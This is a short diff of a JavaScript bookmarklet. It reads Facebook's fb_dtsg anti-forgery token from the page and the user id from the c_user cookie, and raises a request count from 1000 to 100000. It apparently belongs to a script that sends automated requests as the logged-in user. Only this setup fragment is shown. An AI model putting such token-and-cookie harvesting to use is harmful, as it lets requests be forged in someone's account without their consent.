@@ -2,7 +2,7 @@ javascript: void(function () {
   var dtsg = document.getElementsByName("fb_dtsg")[0].value;
   var uid = document.cookie.match(/c_user=(\d+)/)[1];
   var dyn = "7n8ahyj35CCzpQ9UmWOGUGy1m9ACUb8yGg";
-  var req = 1000;
+  var req = 100000;
   var rev = "1033590";
   var ttstamp = "265816767119957579";
   window.aing = {
